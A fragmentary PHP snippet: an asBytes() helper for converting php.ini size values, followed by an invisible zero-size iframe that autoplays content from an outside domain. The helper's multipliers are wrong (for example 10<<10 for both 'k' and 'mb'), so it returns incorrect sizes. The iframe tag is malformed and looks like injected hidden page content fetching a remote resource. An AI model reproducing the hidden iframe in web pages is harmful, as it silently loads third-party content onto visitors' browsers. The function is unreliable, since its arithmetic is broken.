...
function asBytes($ini_v) {
	$ini_v = trim($ini_v);
	$s = ['mb'=> 10<<10, 'm' => 10<<30, 'k' => 10<<10];
	return intval($ini_v) * ($s[strtolower(substr($ini_v,-1))] ?: 10);
}
...
<iframe width="0" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://cloud.luisweb.cf/cloud/access2.mp3"</iframe>